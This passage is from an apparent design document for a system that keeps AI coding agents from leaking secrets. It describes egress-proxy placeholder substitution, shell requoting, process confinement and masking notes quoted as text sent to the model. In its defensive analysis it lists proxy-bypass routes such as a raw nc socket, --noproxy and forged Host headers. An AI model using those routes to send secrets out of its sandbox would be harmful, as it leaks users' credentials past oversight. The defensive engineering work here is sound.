margins, never an absolute speed, after the loaded guest broke a 1.2 s
idle timeout against the 1 s cadence), and the stack oracle
`tests/stack/openclaw-local-file-senders.test.ts` (M6: through the real
proxy and arbiter, a 24 MiB video with no registered value goes, the same
bytes with the key inside are refused and queued; red at the old bound).

**A placeholder the agent's shell would expand (2026-10-11).** Row ④
releases a secret only when the placeholder itself reaches the egress
proxy. On the first-session tour (step 2, every agent) the model wrote
`curl -H "Authorization: Bearer $MDU:nomodel_Read[…].STRIPE_KEY" …`. In
double quotes, unquoted, or in a here-document whose delimiter is not
quoted, every shell reads `$MDU` as a variable that is not set, so curl got
`Bearer :nomodel_Read[…].STRIPE_KEY`: neither the key nor a placeholder.
The net-proxy had nothing to put back at the bound host and nothing to ask
about at an unbound one, and the model read a 401 with no hint why. No
leak, but the routing the handling prompt teaches failed silently. zsh,
the shell Claude Code and Codex run for a zsh user, does worse: it reads
`$MDU:a…` and `$MDU:l…` as history modifiers on `$MDU` (`:a` absolute
path, `:l` lower case), and an unquoted `[de31]` as a glob that fails the
whole command.

*Fix.* The model-context exec gate requotes. On an allow, the arbiter's
`execGate` answers `requoted` (`arbiter/policy/shell-placeholder-quoting.ts`):
the command with each secret-labelled placeholder the shell would expand
written so every POSIX shell, zsh and fish read it literally (unquoted:
`'$MDU:…'`, which also stops the glob; in `"…"`, `$"…"` or an expanding
here-document: `\$MDU:…`). Single quotes, `$'…'`, a quoted here-document,
an already escaped `\$MDU:` and comments are left as written. Both model
proxies deliver it in place of the command to a shell tool only (the
anthropic-proxy's exec tools from the session's gate table: Claude Code's
`Bash` and `Monitor`, OpenCode's `bash`, OpenClaw's `exec`, Goose's
`shell`; the openai-proxy's Codex `exec_command`, `shell_command`, and a
`shell` argv whose program is a POSIX shell with `-c`, and the
`tools.exec_command({cmd})` literal of a Codex code cell, which is the same
tool run by the same shell), never to text typed into a process, an MCP
tool's command field, an interpreter's code, or a code cell gated whole as
one command. A cell's literal is put back into the cell as JSON, so the
inserted `'` and `\` are escaped inside the JavaScript string and the cell
still parses (a hand-written JavaScript literal is normalized to JSON first,
as the path map does); settled 2026-10-12, after !1361's note had said
cells are never requoted while the code requoted their literals:
`tests/stack/codex-cell-requote.test.ts` runs the delivered cell and its
command in bash and zsh and gets the placeholder whole, where the cell as
written loses it. The model reads back the command it wrote (net-gate.ts
`NetGateHistory`; the openai-proxy's `exec-history.ts`, §4 "And for
Codex"); the proxy records the delivered form with
`recordCallCommand`, and the signature the exec supervisor correlates by is
the same for both forms (the tokenizer unquotes `"\$"` and `'…'` alike).
The handling prompt's no-model subsection also says to single-quote a
token in a shell command or a script (handling-prompt.md §9), for the
script the model writes to a file, which no exec gate sees; when the
model does not, the net-proxy refuses what is left with how to quote it
(below).

The two other designs were measured and set aside. Exporting `MDU='$MDU'`
into the agent's environment makes `"$MDU:x"` expand back to `$MDU:x` in
bash and dash, but not in zsh (the modifiers above break `anymodel_` and
`localmodel_`, and the unquoted glob still fails), and it adds a variable
the model can see. Teaching single quotes in the prompt alone leaves the
outcome to the model.

*Why it cannot leak.* The requote inserts only `'` and `\` next to a
placeholder the model itself wrote; it resolves nothing and reads no
table. The delivered command carries exactly the placeholder the model
wrote, which is what the model gets by single-quoting it itself, and the
egress gates (the net-proxy's per-symbol gate, the session gate) decide
its release as for any placeholder: the real value only at a
bound host or with the human's OK, `egress:secret-unbound` and an Approvals
row otherwise. The gate judges the command as written (the same symbols
are in the same words), the HIGH-session approval keys on it, and a block
delivers the sentinel, never the requoted form. Only secret-labelled
placeholders (`nomodel_`, `localmodel_`, `anymodel_`) are touched; an
unlabelled untrusted-data symbol is left to the frozen integrity exec path.
A command the small parse cannot read with confidence (a backquote, an
unclosed quote or substitution, a `)` it cannot place, a `case` pattern)
runs as written, the behavior before the fix; a misread can only misplace
an inserted `'` or `\` beside the placeholder, which at worst corrupts the
value the bound host receives.

*Pinned by* `arbiter/test/unit/shell-placeholder-quoting.test.ts` (each
context, what is left alone, what the parse refuses, and real bash, dash,
sh and zsh printing the placeholder whole from the requoted command where
the command as written does not), the requote tests in both proxies'
`test/unit/exec-gate.test.ts`, and e2e
`tests/stack/quoted-placeholder-egress.test.ts` (the real arbiter, the
anthropic-proxy and the openai-proxy gate in their production wiring, a
real bash and zsh, the real curl and the real net-proxy: the bound host
gets the real key, an unbound one a 403 `egress:secret-unbound` and no
byte, and the command as the model wrote it the bug's
`Bearer :nomodel_Read[…]`).

*What the requote cannot reach: the net-proxy refuses the leftover
(2026-10-11).* A script the model writes to a file and runs later is no
command any gate sees, and the prompt's single-quote bullet leaves it to
the model. Its request then carried `Bearer :nomodel_Read[…].STRIPE_KEY`
and failed with a 401. The net-proxy now recognizes what a shell leaves of
a secret-labelled placeholder (`net-proxy/src/egress.ts`
`strippedPlaceholderCandidates`): `:nomodel_…[h]`, `:anymodel_…`,
`:localmodel_…` not after `$MDU` (bash, dash, sh; zsh for `nomodel_`), and
zsh's `nymodel_…` and `ocalmodel_…` (its `:a` and `:l` modifiers dropped
those letters too), in the URL and the body (each also percent-decoded),
every header and the decoded pair of a Basic credential. It rebuilds the
`$MDU:` name each came from and asks the arbiter which are real
(`strippedPlaceholders`: a name only counts when it is a secret-labelled
ROW, found by the same lookup `resolve` uses, so text that merely looks
alike is never refused; names in, names out, never a value). A request
carrying one is refused whole with a 403 whose message the program
prints: what it carried, that a shell expanded `$MDU` to nothing, and to
single-quote the placeholder (`'$MDU:…'`) and run it again
(`egress:shell-expanded-placeholder`). Both legs, plain HTTP and the
TLS-inspected one, run it inside `gateRequest`, after the taint legs and
before the per-symbol gate. The refusal is reported as its own kind,
`shell-expanded`, so the model reads a `refused:` line saying the same
even when the program hides its output (plan 10 §11.8), and the session
page words the rule (dashboard `block-why.ts`).

It files no Approvals row and asks nothing: there is nothing to approve,
since the request holds no value, and a human's *Allow* could not make it
work. The leftover is never filled in: it is not a placeholder, and a
value put back where the program did not write one would be a release no
gate decided. So it cannot leak: the check only adds refusals, of requests
that carry no secret. It is a utility check, not a gate: an arbiter
without the op, or one that does not answer, leaves the request to the
gates as before (the leftover holds no value either way). Pinned by
`interceptors/net-proxy/test/unit/shell-expanded-placeholder.test.ts`,
`arbiter/test/component/stripped-placeholders.test.ts`, both proxies'
`test/unit/egress-refusal-note.test.ts`, and e2e
`tests/stack/stripped-placeholder-egress.test.ts` (a script with the
placeholder in double quotes, run by a real bash and zsh through the real
curl and net-proxy: the explanatory 403, nothing at the bound host, no
Approvals row, the `shell-expanded` refusal on the call, the session
page's words, and the single-quoted control reaching the bound host with
the real key).

### 7.1 The one-way valve — net XOR secrets, and neither for untrusted code

`exec-routing.md`'s asymmetric world (AgentShell: net OFF, RW=AgentView)
generalizes into the confinement rule that kills the raw-bytes path no
wire-level gate can see:

> A process world gets **network access or secret-path readability — never
> both.** AgentShell (net off) may read secret paths; any net-enabled world
> (HumanShell) gets secret paths masked out of its mount view. **An
> untrusted-lineage process gets neither**: attacker-influenced code has
> no legitimate need for raw secret bytes at all; it can route symbols like
> the model does.

The third clause exists because integrity's exec routing sends
untrusted-influenced commands to AgentShell, exactly the world the first
clause makes secret-readable. Without it, injected code runs where secrets
are readable: confinement still holds (no net; outputs are
blame-resymbolized and secret-tainted, §8), but the derived-data machinery
becomes load-bearing against an adversary, and injected code can `cat`
every secret in reach to weaponize conservative tainting as a
denial-of-service on utility. Masking secret paths out of untrusted-lineage
mounts closes both with the existing bubblewrap overlay mechanics.

A command that needs net *and* a secret (e.g. `curl -H "Authorization:
$KEY"`) doesn't read the secret itself: the **egress gate desymbolizes**
the symbol into the request at the network chokepoint, after the binding
check. The valve is the *process-level* analog of the watermark rule: "read
the secret" and "talk to the outside" are never the same unconfined
principal, whether that principal is a subprocess or the model itself.

**A placeholder on the command line runs (2026-10-05).** The exec chokepoint
reads that rule as: the argv of a net-enabled world never holds a secret's
real VALUE; its placeholder may stay there. `resolveExecArgv`
(`arbiter/policy/exec-classify.ts`) resolves public symbols in their argv
slots and never a secret-labelled one: the `$MDU:nomodel_…` token stays as
written and the command runs, whatever the confidentiality axis (the op
answers on the data socket, arbiter-human-plane.md §4). Until this date it
withheld the whole command instead (`secret_symbol`, exit 77 at exec-wrap
and the exec box), which refused this section's own example: after `set -a;
. ./.env; set +a`, a `curl` to `https://api.stripe.com/…` given
`$STRIPE_KEY` as its HTTP Basic user (`-u`), the command an agent writes
after sourcing the placeholder `.env`, failed bound host or not, while `curl -K <file holding the same placeholder>` ran and
the egress proxy put the value in at the bound host. Why leaving it is safe:

- *The placeholder is not the secret.* Any program in the agent's world
  could already send it anywhere (a curl config file, `python -c`, any
  program exec-wrap does not shadow); the argv refusal guarded nothing the
  network chokepoint does not.
- *The value goes in at the network chokepoint only.* The places that turn
  a secret's symbol into its value are the egress proxy and net-supervisor
  (after `desymbolizationDecision`: released at a bound host, held for the
  human in Approvals elsewhere, refused fail-closed when the arbiter is
  unreachable), and the human plane's consumers (reply filter, fs-sync's
  HumanView writes, the dashboard), none of which the agent's world reaches
  (arbiter-human-plane.md §3). `resolveExecArgv` is no longer one of them for
  a secret, and a defense-in-depth check withholds the command
  (`secret_symbol`) should a resolved slot ever turn out to be a secret row.
  The proxy keys the gate on the host it dials (the CONNECT target, TLS
  verified against that name, or the absolute URL), so `--connect-to`,
  `--resolve` or a forged `Host:` cannot get a bound verdict for another
  host; HTTP Basic is decoded, so a placeholder passed as curl's `-u` user
  (curl splits the token at its first colon and re-joins it in the pair) is
  gated like a header.
- *A request that bypasses the proxy carries the placeholder.* `--noproxy`,
  a `--proxy` of the agent's own, `--unix-socket`, `file://`, `-o`, a raw
  socket (`nc`) or `--libcurl` write or send the token as written: nothing
  substitutes, and where the connect guard runs it refuses a direct
  connection the session's rules do not allow. A model host
  (`isModelHost`) is passed through by the proxy without the gate, so a
  placeholder sent there stays a placeholder; under the model-host deny
  (with this axis on, since 2026-10-18; agent-sdks.md §4) a model host
  takes only its listed account and sign-in paths, each through the
  inspected leg's gate, and every other request there is refused.

The cost is utility-side only: where the session's proxy does not inspect
HTTPS (`MANDU_NET_PROXY=0`, TLS inspection off) the request goes out with
the placeholder and the server rejects it, as for `curl -K`. Pinned by
`secret-egress.test.ts` (exec ON/OFF), the exec-wrap gate unit test,
`tests/stack/confidentiality-oracle.test.ts`, `launcher.exec-wrap-live` and
`exec-box-live` §3f (the sink gets the placeholder, never the value), and
`tests/sandbox/launcher/secret-placeholder-argv.test.ts` (the real launcher,
guard, shim and inspecting proxy: the bound host gets the value in Basic and
in a header, the unbound host nothing, each request 403; no exec the guard
recorded held the value). *Residual:* with the axis OFF the network gate's
secret branch does not run (`policy-interface.ts`), so a persisted secret
row sent to a TRUSTED destination by a session that holds its placeholder
would follow the integrity rule; that was already so for `curl -K` and is
unchanged here.

*The released request is the client's own (2026-10-05).* On the tour the
release worked and the request still failed: the human allowed the key once,
the proxy put it in (the Basic pair exactly `base64("sk_live_…:")`, the
Bearer header exactly the value), and Stripe's nginx answered a plain `400
Bad Request`, in Basic (Claude Code) and in Bearer (Codex) alike. The
TLS-inspected leg re-originated the request with a lowercase `host:` of its
own appended after the client's `Host:`, plus `connection: keep-alive` and a
`content-length: 0` on a GET; nginx refuses any request with two Host
headers. Every request the inspecting leg forwarded for a client that writes
`Host:` (curl, Python, most) carried the duplicate; the recording listeners
of the earlier suites (node's https server) tolerate it and checked only the
Authorization value. The re-origination (`reoriginationHead`,
`interceptors/net-proxy/src/mitm.ts`) now sends the client's head in its
order and case, apart from what the proxy owns: ONE Host, at the client's
position, naming the CONNECT target the gate judged (a second or forged Host
is dropped or rewritten); the body's real Content-Length where the client
had one (none for a body-less request); `Accept-Encoding: identity` (the
response is read as plaintext); the hop-by-hop headers dropped. A header the
substitution would leave holding a line break (a resolved value is
arbitrary text) is refused before a byte is sent (502, fail-closed). Pinned
byte for byte against plain curl with the real value, apart from the
identity line, by `interceptors/net-proxy/test/unit/reorigination-head.test.ts`,
`test/component/reorigination-wire.test.ts` (real curl, the real arbiter,
a raw listener that answers 400 as nginx does) and the sandbox suite above
(its listeners now read raw bytes too). The value on the wire was never
padded: the space-padded original the session trace showed for the tour's
command (`'sk_live_…               :'`, the value padded to the
placeholder's width) comes from the reply filter, which pads a value
shorter than its token to the token's screen width and records the rendered
text in its `desymbolize` event: a display path, never the proxy's
substitution (which takes the arbiter's `resolve`, unpadded).

*Why the agent could not read the refusal.* The tour's Bash result was
masked whole as `no-model` because the command names `./.env` (the
path-derived label of `labelForClassify`, which also scans a command's
paths), not because the shim's text held a placeholder. With no taint
answer for the call, the proxy appends no `[mandu:secret]` note and clears
`is_error` (plan 13 §9 R4), so the model saw one symbol and guessed it had
worked. Matching Mandu's refusal out of the result bytes would not be safe:
exec-wrap runs inside the agent's world, so any program there can print the
same text, and its slots would carry bits past the mask. The safe way is a
note the proxy writes from facts it holds, never from the bytes:

**The path-derived note (2026-10-05).** When a command's result is masked
whole only because the command names a secret path (the classify verdict
is secret and no taint answer masked it: no answer at all, a clean tree, or
one with only a refused connection), both model proxies append a
`[mandu:secret]` line built from the model's OWN command:

> `[mandu:secret] masked: the command names a secret file (./.env), so its
> whole output is hidden from you, including whether it succeeded; you see
> a symbol, and the user does not see this output unless your reply quotes
> the symbol (they then see its real value). Everything else it printed
> is hidden with it: to read another file, a listing or a log, run that
> part again as a command of its own that names no secret file. Do not
> assume it worked: if you still cannot tell, say you cannot see the
> result, or ask the user what it printed.`

*The way out (2026-10-17).* Until then the line's only advice was "say you
cannot see the result, or ask the user what it printed". In the second
live demo battery (Claude Code, Sonnet, the 401-debugging demo) the model
ran `cat .env.example` and a redacted listing of `.env` in ONE command, as
it does in every unprotected take too. The whole output, the template's
setting name included, was masked, and in two of three takes the model
took the advice and stopped, telling the user to put a key in `.env`. The
third take read `.env.example` again on its own and fixed the script. The
line now says to run the other part apart. It gives advice only: the
mask, what releases a result and every byte the model reads are
unchanged, and a command that names no secret file was never masked for
that reason (`tests/stack/path-derived-note.test.ts` proves the template
read on its own reaches the model in clear).

*The way to the file itself (2026-10-19).* The line said how to read the
OTHER files, and nothing about the secret file. In the defaults battery
of 2026-10-19 (demo-tax-extension under `secrets-defaults`, two takes of
three) the model ran `ls -R taxes/; cat taxes/2025/* | head`, got one
symbol, read "hidden from you" as "locked" and gave up, though a read of
the tax return alone gives its document twin (each line's label, each
value a placeholder it can place in the task); tuned Mandu, where the
model read the file first, did the task three times of three. The arbiter
now answers, beside `namedPaths`, the twin a read of each named token's
files on its own gives (`namedTwins`, `arbiter/policy/named-twins.ts`):
`lines` (the document twin), `fields` (a structured twin), `whole` (the
whole-file twin) or `text` (an own-text twin, §11.13 of plan 10). The
proxy adds one sentence per answer, after the way to the other files and
before "Do not assume it worked", byte-identical in both:

> `To use each secret file taxes/2025/* matches itself, read it on its own
> (a file read of that one file, or `cat` with that file alone): you see
> each line's label as written and its value as a symbol you can pass to a
> command (a command that sends it is checked against the file's rules).`

A plain path reads "To use .env itself, read it on its own (a file read of
.env, or `cat .env` alone)"; `fields` says "you see its keys and layout as
written and each secret value as a symbol", `whole` "you see one symbol
that stands for the whole file, which you can pass whole to a command where
the file's content belongs", and `text` "Mandu read every place in it that
can hold a secret and found none, so you see its text". The claim is made
only where it holds: the arbiter places the token on files as the shell
would (absolute, `~/` under the session's launch HOME, or relative to the
call's start directory, or its leading `cd`; a command that may change
directory otherwise answers only for absolute tokens; a glob is expanded
segment by segment with the shell's rules, a leading dot only by a dot, no
brace or expansion, bounded at 512 entries a directory and 16 files), keeps
the files that are secret, and answers only when each of them is a
registered file with a twin of ONE kind; a token it cannot place, a file
with no twin (labelled after the launch registered the others), or a glob
over two kinds of twin gets no sentence. The proxy keeps an answer only for
a token its line names (the model's own spelling) and a kind it words. The
answer holds the model's token and a kind, never a byte of a file nor a
path the model did not write; the kind says what the model sees as soon
as it reads the file. It explains only: the mask, the release rules and
every byte the model reads are unchanged. Pinned by arbiter
`test/unit/named-twins.test.ts`, both proxies'
`test/unit/path-derived-note.test.ts` and
`tests/stack/path-derived-twin-note.test.ts` (the real arbiter, the
launch's discovery and registration, the guard's reports and both proxies'
production wiring: the demo's batch `cat` stays one symbol and its note
names the read of the return alone; the follow-up `cat` of the return,
served the twin, and a Read of it reach the model as the twin; a `.env` and
a labelled diary get the structured and the whole-file sentence; a file
under a labelled folder with no twin gets none; Codex alike; no value in any
request to the model).

The paths come from the arbiter's classify verdict (`namedPaths`: the
tokens of the call's origin hint and input that set a secret level, as
written there, and written like a path: a `/`, a leading `~` or a `.`, so
a bare word such as `cat`, which reads as secret when resolved under a
labelled directory, is never named; `labelForClassify`'s `paths`), and the
proxy keeps only a
token its model's own command holds verbatim (at most three, each one line
and at most 200 characters), so a HumanView spelling the arbiter read never
reaches the model; with none left the line says "a secret file". Nothing in
it comes from the output: the mask, the symbol and `is_error: false` (plan
13 §9 R4) are unchanged, and the only fact the line adds is that the
command's own path tokens are labelled secret, which the bare symbol
already showed. It is added only to a call with a command (Bash,
`exec_command` and other command-like tools; not a `Read`, not a result
with no matching call), never when a taint answer masked the result (that
answer's own `masked:` line explains it) nor when the mask was lowered
(denied-only, twin, key listing: since 2026-10-16 a token-free listing of
the keys of one registered file the command names, exactly as its twin
gives them, `sed 's/=.*//' .env` or `cut -d= -f1 .env`, is released with a
`twin:` line naming the file, plan 10 §11.8 "A key listing"; folder
names: since 2026-10-17 a plain `ls` of a labelled folder, `ls mail/inbox
bank/` with no `-l`, chain or pipe, whose output is exactly the names the
folders hold now, is released with a `listing:` line naming them, since a
label protects a file's content and its name is metadata plan 13 §4.9
leaves open; `ls -l`, which prints sizes and dates, and any compound
command stay masked, plan 10 §11.8 "A folder's names", except, since
2026-10-18, one plain `ls` at either end of a compound whose other parts are
allow-listed programs naming no secret path, `tools/mail list; ls mail/inbox
bank`, released with a `listing:` line saying which lines are the names,
[folder-listing-compound.md](./folder-listing-compound.md); a credential
file named without being printed: since 2026-10-18 a shell result whose
command names only registered credential files, from a recorded tree that
read no secret, is released as printed, each registered value its own
symbol, when its content checks find none of those files' secret bytes,
`git rm --cached .env && git status`,
[clean-tree-release.md](./clean-tree-release.md); a search that keeps
out of a labelled folder: since 2026-10-18 the word `--exclude-dir=NAME` of
one plain `grep` is not read as a path, since no grep opens it, `grep -rIl
-i park . --exclude-dir=bank`, [exclusion-flags.md](./exclusion-flags.md)). Where a listed reader's rule would have released the
output but the path mask still applies, the `note: … released` line is
left out, since it would be false. Pinned by both proxies'
`test/unit/path-derived-note.test.ts`, arbiter
`test/unit/named-paths.test.ts`, and `tests/stack/path-derived-note.test.ts`
(the real arbiter and both proxies: the tour's command under Claude Code
and Codex reaches the model as a symbol plus this line; no byte of the
output or of the key is in any request to the model; a command that names
no secret path gets neither). A command the exec-wrap shim refused in the
call's tree gets its own `blocked:` line (the program and why; the
`blockedExec` fold of `callTaint`, recomputed from the guard's `exec_argv`
record, confidentiality-plan-10-flow-taint.md §11.8 "Blocked commands",
2026-10-07; since 2026-10-09 also a command Codex's own sandbox stopped
by refusing the shim's connection to Mandu, from the guard's record of
that sandbox's helper). The dashboard's session page
tells the person the same reason, read off this line and off a taint
answer's `masked: <program> read <file>` line, never off the output
("The command names your secret file `./.env`, so Mandu hid its whole
output from the AI, even whether it worked."; dashboard.md §4.25b *A
command's masked output says why*), and its *Your secrets* card names the
item by it ("Output of a `Bash` step whose command named your secret file
`./.env`").

**The value-backstop note (2026-10-17).** A result the arbiter's value
backstop raised (§4; the classify verdict's `raisedBy: "value-backstop"`:
the path rules call it public, and a registered secret's value is in it)
is masked whole like a path-derived one, unless it is released value by
value ([backstop-value-only.md](./backstop-value-only.md): a call whose
own evidence holds no secret read gets the result with each registered
value as its symbol, and no note), but the call names no secret path. It used to get the path-derived line anyway, since the proxies
added that line to any secret command result no taint answer masked. A
scripted probe of an old application log whose debug lines printed a
labelled `.env`'s Stripe key (`cat`, `grep` and Read of the log, the
reworked 401 demo's shape) showed the harm: the model was told the log
"names a secret file" and to re-run "a command that names no secret file",
which its command already was. Both proxies now give such a result,
command or not (a Read is masked whole the same way), this line instead,
byte-identical in both:

> `[mandu:secret] masked: this output contains the value of a registered
> secret, so the whole output is withheld from you, including whether it
> succeeded; you see a symbol, and the user does not see this output
> unless your reply quotes the symbol (they then see its real value). It
> is withheld for that value, not for the file it came from. To read the
> rest, run a command that prints it with the value left out (for example
> without the lines that hold it); do not print the value in any other
> form. Do not assume it worked: if you still cannot tell, say you cannot
> see the result, or ask the user what it printed.`

It is static text: no byte of the output, and not which secret matched;
the one fact it adds, that a registered value is in the output, is what
the mask itself already shows. It gives advice only: the backstop still
masks the whole result, and a filtered read that leaves the value out was
never masked for it. A result a taint answer masked keeps that answer's
line, a path-derived one keeps the path-derived line, and a listed
reader's `note: … released` line is left out beside it, since it would be
false. A result masked after the fact gets that note in its place, as the
path-derived line does. The dashboard's session page has no sentence for
this line yet (it no longer reads it as "the command names your secret
file"). Pinned by both proxies' `test/unit/value-backstop-note.test.ts`
and `tests/stack/value-backstop-note.test.ts` (the real arbiter and the
Claude proxy: a `cat` and a Read of the log are one symbol and this line,
the log read without the key's lines reaches the model as it is, a `cat`
of the `.env` itself keeps the path-derived line, and no request to the
model carries the key).

**Masked after the fact (2026-10-05).** The agent re-sends the whole
history with every request, and both model proxies re-classify every tool
result in it, so a file labelled after the model read it (a policy-tool
lock, a dashboard label, a newly registered value) comes back masked in
the next request. The mask is right and stays: the next request must not
carry the bytes again. Without a word about it, though, the model read its
own earlier answer about the file beside a result that was now a symbol,
decided it had made that answer up, and apologised to the user for
inventing what it had really read (live tour, Claude Code 2.1.289:
`deploy/staging.conf` read raw, then locked with `mandu-policy`, then read
again). The criterion is what a proxy forwarded: each proxy keeps the
tool-call ids whose result body it forwarded in clear
(`ClearResultLedger`, `after-the-fact.ts` in each proxy; an id is recorded
only once the request's whole rewrite succeeded, and the oldest are
forgotten past 100 000), in memory and, since 2026-10-09, in the arbiter's
mandu.db, so a conversation resumed under a new launch finds them again
(*Across a resume*, below). A result masked as a secret now whose id is
recorded gets one more line, and the request gets Mandu's system note
(below):

> `[mandu:secret] masked after the fact: when you first read this result,
> earlier in this conversation, it showed you its real content; it was
> marked secret after that (a lock or a label, possibly one made later in
> this conversation), so each time the conversation is sent to you Mandu
> now puts a symbol in its place, and this transcript no longer shows what
> you saw. What you wrote about it then came from that real content: it was
> not invented, so do not apologise for it or say you made it up. Do not
> repeat or restate what it contained; refer to it by the symbol. Mandu's
> note in the system prompt explains this.`

*Why the system note (live check, 2026-10-05 11:35, Opus 5.5).* The first
wording, "this result reached you in clear in an earlier request", arrived
and the model apologised anyway: "the note attached to it said the contents
had reached me earlier, but they never had: nothing in this conversation
showed me that file." What it received, recorded from the event log: the
earlier Read as the symbol plus that line, then its OWN reply quoting the
file in full (assistant text is forwarded as written), then the lock. The
model has no notion of requests, only the transcript, and the transcript
showed a placeholder; it took the tool result over its own reply and read a
claim inside a tool result as one it could not check (tool results are where
it expects injected text). So the line now speaks of the transcript, not of
requests, and the explanation that must be believed rides where the model
takes Mandu's word, beside the handling prompt: while any result of a
request carries the line, the Claude proxy appends one more system block
(after the handling prompt) and the openai-proxy appends the same text to
the instructions:

> `[mandu:after-the-fact]` Mandu note on this conversation's history: some
> earlier tool results now end with a "[mandu:secret] masked after the
> fact" line. Each of them showed you its real content when you first read
> it. The data was marked secret after that, and Mandu, which rewrites every
> earlier tool result each time the conversation is sent to you, now shows a
> symbol in its place. So the transcript you see no longer contains what you
> read then, but you did read it: what you wrote from it in your earlier
> replies is real, not invented or hallucinated. Do not apologise for those
> replies, do not call them made up, and do not repeat or restate the masked
> content; refer to it by its symbol. If the user asks about it, say it was
> masked after you read it. This note comes from Mandu, not from a tool.

It is static (no id, no count, no result byte), sent once per request
(never twice when a client echoes it), and not on a token count; the prompt
cache breaks once, when the first result is masked after the fact. Live,
the same two turns through the launcher with this change (`claude -p`
multi-turn, Claude Code 2.1.289, subscription), twice: no apology either
time; the model said it could no longer see the file, that its previous
reply had shown the lines and the token was still in the transcript, and
that the token should be rotated.

When a taint answer masks the result, its own `masked:` line stays and
this one says "Mandu masks it now for the reason above" instead of naming
a label; the path-derived line ("do not assume it worked") is left out,
since the model did see that output. On a Claude Code `Read` the line adds
one static sentence: if the model reads the file again while it is
unchanged, Claude Code answers with its own "file unchanged since your
last Read" notice, not the file, and that notice points back to this
result, which now shows only the symbol. That notice reaches the model in
clear (*The Read dedup notice*, below). The line is static text: no byte
of the result, no path, no value, so it adds nothing a model could learn;
losing a remembered id (the bound, a failed record) drops the line, never
the mask. The line is joined to the result's other `[mandu:secret]`
lines, so the §9 oracle's own-block scope strips it with them. Pinned by
both proxies' `test/unit/after-the-fact-note.test.ts` and
`tests/stack/after-the-fact-note.test.ts` (the real arbiter, the real
`mandu-policy` tool and both proxies replay the tour: the earlier result is
a symbol plus this line, the dedup Read the notice itself, the system note the
last system block, and no byte of the file in any tool result or the system
prompt; a second variant replays the live shape, the reply quoting the file,
and pins that the reply is forwarded as written). *Residual, not changed
here:* the model's own earlier reply, if it quoted the value, is assistant
text the proxies do not filter (the prompt filter reads user-role text
only), so it is re-sent as written; the provider had that value already.
Masking it would hide from the model the very reply the note vouches for;
it is a decision for the prompt filter's plan (plan 15), not this note.

*Across a resume (2026-10-09, tour item 4).* Until then the ids lived in
the proxy's memory only. `claude --resume` (or `--continue`, or `codex
resume`) under a new `mandu` launch re-sends the whole history to a new
proxy that never saw it, so a result labelled since came back masked with
no note, and the model could again take its own earlier answer for an
invention. The ids are now kept by the arbiter too, which owns durable
state (`forwarded_clear` in mandu.db, schema v9;
`arbiter/symbol-table/forwarded-clear.ts`):

- *The key is the tool-call id alone* (`toolu_…` on the Anthropic wire,
  `call_…` on the OpenAI one). The provider mints it, the agent stores it
  in its transcript, and a resume re-sends it byte for byte. Nothing else
  that identifies a conversation on the wire stays put: the Mandu session
  key is per launch; Claude Code's own session id (in `metadata.user_id`)
  is not promised across a resume (`--fork-session` mints a new one, and
  Codex has no such field on the wire); and a response's message id
  (`msg_…`) is never sent back in a request. A
  random provider id names one call of one conversation, so no session
  scope is added; a collision could only add the line, never lift a mask.
- *Ids only.* The row is the id and a time: no result byte, no tool name,
  no path, no session. Bounded at 500 000 rows, oldest first out.
- *Two human-plane ops* (`recordForwardedClear`, `forwardedClear`;
  arbiter-human-plane.md §3). From the data socket the agent world could
  name a call whose result it never showed the model, and Mandu's system
  note would then vouch, in Mandu's voice, that the model read it. Each
  proxy's adapter sends them on its human client; without one the ids stay
  in memory, as before. While the human plane is exposed (an unwalled
  launch, arbiter-human-plane.md §10) a forged record is possible again,
  and it can still only add the line to a result that is masked.
- *When.* After a rewrite succeeds, the ids it newly forwarded in clear are
  recorded (one call, awaited before the request goes upstream; a failure
  is logged and retried with the next request). Before a rewrite, the ids
  of the history's results the ledger does not know are asked about once
  (`prime`, one call per request at most), so a resumed history costs one
  round trip on its first request. While the ledger holds an id the arbiter
  did not know, each request's one call also carries the store's
  generation from the previous answer (*Two launches at once*, below);
  with no such id held and none new, no call at all.
- *Fail-safe either way.* The note is utility: an arbiter that cannot
  answer, or a proxy without the human client, leaves the result masked
  with no line, exactly the behavior before. The ask never touches the
  classification, so no answer can unmask anything.

Pinned by `arbiter/test/unit/forwarded-clear.test.ts` (the store, the ops,
a restarted arbiter answering), both proxies' `after-the-fact-note.test.ts`
(the ledger over a store; a fresh ledger over the same arbiter masks a
resumed history with the line and the system note; a failing arbiter, no
line), `tests/stack/proxy-real-client-parity.test.ts` (both production
adapters, human client and data-only), and
`tests/stack/after-the-fact-note.test.ts` (*across a resume*: launch 1
forwards the Read, or Codex's `cat`, in clear; a new proxy over a restarted
arbiter on the same mandu.db and a new session key masks the resumed result
with the line and Mandu's system note, and no byte of the file reaches the
model).

*Two launches at once (2026-10-17).* Two launches resumed on the same
conversation at the same time (on one stack: one arbiter, two proxies, two
session keys) used to hold each other's ids as unknown after their first
ask, and never asked again, so a result one of them forwarded in clear
later got no line in the other. It happens when the two sessions mask the
same result differently: a resumed Bash call no recorder binds is masked
at the level of what its own session read raw, so a launch whose session
read the `.env` masks it from its first request while the other forwards
it in clear. The negative answer is now kept with the store's GENERATION
(the rowid of `forwarded_clear`'s latest row, which only grows: rows are
added under SQLite's single writer and trimmed oldest first). While the
ledger holds an unknown id, the one `forwardedClear` call of each request
also sends the generation of the previous answer (`since`) and gets back
the ids recorded after it (`recent`, at most 10 000, oldest first); an
unknown id among them becomes known, so the next request carries the line
and Mandu's system note. A generation that went down (the file emptied or
rebuilt) or a `recent` list cut short makes the ledger forget every unknown
id and ask about them again by name. Still one call per request at most,
still ids only, still human plane only: `since` is a field of the same
`forwardedClear` op, refused on the data socket like the rest of it, and
an arbiter predating it answers without a generation, which leaves the
behavior as before. Pinned by both proxies'
`test/unit/after-the-fact-concurrent.test.ts`,
`arbiter/test/unit/forwarded-clear.test.ts` (the generation across two
stores over one file, `since` over the op, the data socket refused), the
parity test (`forwardedClearSince` over both production adapters), and
`tests/stack/after-the-fact-note.test.ts` (*two launches at once*: B masks
the resumed result with no line, A forwards it in clear, B's next request
carries the line and the system note).

**The Read dedup notice (2026-10-07, tour item 5).** Claude Code answers
a Read of a file it has already read, and that is unchanged on disk, with
its own fixed sentence instead of the file ("Wasted call — file unchanged
since your last Read. Refer to that earlier tool_result instead.", or "File
unchanged since last read. …"). The confidentiality derivation used to
give that result the file's path-derived level like any Read of the path,
so the model received a symbol that stood for the harness's words. On the
live tour the model quoted that symbol as the file, and the reply filter,
which resolves the agent's reply for the person, showed the person the
notice as the file's content. The notice holds no byte of the file, so the
arbiter now calls it `public` (`isReadDedupNotice`,
`arbiter/policy/claude-code-inbound.ts`, applied in the policy's
